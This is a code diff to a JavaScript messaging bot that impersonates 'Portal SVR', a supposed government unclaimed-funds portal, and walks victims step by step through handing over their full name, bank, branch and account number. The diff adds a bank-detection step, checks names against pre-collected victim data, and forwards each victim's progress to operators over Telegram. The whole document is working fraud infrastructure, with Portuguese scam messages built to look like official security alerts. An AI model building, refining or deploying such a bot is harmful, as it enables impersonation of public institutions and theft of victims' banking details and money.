@@ -1003,24 +1003,39 @@ async function processIncomingMessage(msg, targetChatId) {
         const typedName = text.trim();
         if (typedName.length >= 8 && typedName.includes(" ")) {
             if (currentSession.expectedData?.fullName) {
-                const portalName = currentSession.expectedData.fullName.toLowerCase();
-                const firstName = typedName.toLowerCase().split(' ')[0];
-                if (!portalName.includes(firstName)) {
-                    await sendBotMessage(targetChatId, `⚠️ *ALERTA DE SEGURANÇA — Portal SVR*\n\nO nome informado não corresponde ao titular cadastrado no sistema.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em documento oficial:`);
+                const isMatch = checkNameMatch(typedName, currentSession.expectedData.fullName);
+                if (!isMatch) {
+                    await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nO nome informado não corresponde ao titular registrado no protocolo.\n\nPor favor, digite o nome completo exato (Ex: João da Silva Santos):`);
                     return;
                 }
             }
-            currentSession.step = 3;
+            currentSession.step = 2.5;
             currentSession.name = typedName;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            await sendBotMessage(targetChatId, `✅ *Nome confirmado!*\n\n📍 *FASE 1.3 — Dados Bancários:* Para prosseguir com a vinculação do resgate, informe sua *Agência* bancária:\n\n📌 *Exemplo:* 0001`);
+            if (currentSession.tgMsgId) {
+                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
+                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+            }
+
+            await sendBotMessage(targetChatId, `✅ *Nome Completo confirmado!*\n\n📍 *FASE 1.3:* Informe o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
         } else {
-            const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
             const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
-            await sendBotMessage(targetChatId, aiReply || fallback);
+            await sendBotMessage(targetChatId, fallback);
         }
+    } else if (currentSession.step === 2.5) {
+        const detected = detectBank(text);
+        if (!detected) {
+            await sendBotMessage(targetChatId, `⚠️ Não consegui identificar este banco. Por favor, escreva o nome do banco corretamente (Ex: Nubank, Bradesco, Santander, Itaú).`);
+            return;
+        }
+        currentSession.bankName = detected.name;
+        currentSession.bankCode = detected.code;
+        currentSession.step = 3;
+        chatSessions.set(targetChatId, currentSession);
+        saveSessions();
+        await sendBotMessage(targetChatId, `🏦 Banco identificado: *${detected.name}* ✅\n\nAgora informe os números da sua *Agência* bancária:`);
     } else if (currentSession.step === 3) {
         const typedAg = text.trim().replace(/\D/g, "");
 
@@ -1029,7 +1044,13 @@ async function processIncomingMessage(msg, targetChatId) {
             currentSession.bankAg = typedAg;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
-            await sendBotMessage(targetChatId, `✅ *Agência registrada.*\n\n📍 *FASE 1.4:* Agora informe o número da sua *Conta* (com o dígito, se houver):\n\n📌 *Exemplo:* 12345-6`);
+
+            if (currentSession.tgMsgId) {
+                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
+                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+            }
+
+            await sendBotMessage(targetChatId, `✔️ *Agência confirmada*\n\nAgora informe o número da sua *Conta* com dígito:`);
         } else {
             await sendBotMessage(targetChatId, `⚠️ *Agência Inválida*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001).`);
         }
@@ -1037,51 +1058,25 @@ async function processIncomingMessage(msg, targetChatId) {
         const typedCc = text.trim();
         const cleanCc = typedCc.replace(/\D/g, "");
         if (cleanCc.length >= 4) {
-            let detectedBank = null;
-            // Prioriza os bancos mais comuns na varredura para evitar "Planner Corretora" em tudo
-            const priorityBanks = ["104", "001", "341", "237", "033", "260", "077", "336"];
-            
-            // Varredura nos bancos prioritários
-            for (const code of priorityBanks) {
-                if (validateBankData(code, currentSession.bankAg, typedCc).valid) {
-                    detectedBank = { code, name: BANCOS_LIST[code] || "Banco do Brasil" };
-                    break;
-                }
-            }
-            
-            // Se não achar nos prioritários, varre a lista inteira
-            if (!detectedBank) {
-                for (const code of Object.keys(BANCOS_LIST)) {
-                    if (validateBankData(code, currentSession.bankAg, typedCc).valid) {
-                        detectedBank = { code, name: BANCOS_LIST[code] };
-                        break;
-                    }
-                }
-            }
 
-            const bankName = detectedBank ? detectedBank.name : "Instituição Identificada";
-            const bankCode = detectedBank ? detectedBank.code : null;
+            const validation = validateBankData(currentSession.bankCode, currentSession.bankAg, typedCc);
 
-            if (!bankCode) {
-                await sendBotMessage(targetChatId, `⚠️ *DADOS INCONSISTENTES*\n\nA agência e conta informadas não correspondem ao padrão de nenhuma instituição bancária reconhecida.\n\nPor favor, informe o número da agência novamente:`);
-                currentSession.step = 3; 
-                chatSessions.set(targetChatId, currentSession);
-                saveSessions();
+            if (!validation.valid) {
+                await sendBotMessage(targetChatId, `⚠️ *DADOS INCONSISTENTES*\n\nA agência e conta informadas não correspondem ao padrão do banco *${currentSession.bankName}*.\n\nPor favor, informe o número da *Conta* novamente:`);
                 return;
             }
 
             currentSession.step = 5;
             currentSession.bankCc = typedCc;
-            currentSession.bankName = bankName;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
             await sendBotMessage(targetChatId,
-                `🏛️ *${bankName.toUpperCase()} CONFIRMADO* ✅\n\n` +
+                `🏛️ *${currentSession.bankName.toUpperCase()} CONFIRMADO* ✅\n\n` +
                 `📍 *DADOS CAPTURADOS:*\n` +
                 `- Agência: ${currentSession.bankAg}\n` +
                 `- Conta: ${currentSession.bankCc}\n` +
-                `- Instituição: ${bankName}\n\n` +
+                `- Instituição: ${currentSession.bankName}\n\n` +
                 `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
                 `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas.\n\n` +
                 `*Responda SIM para confirmar* ou informe os dados novamente.`);
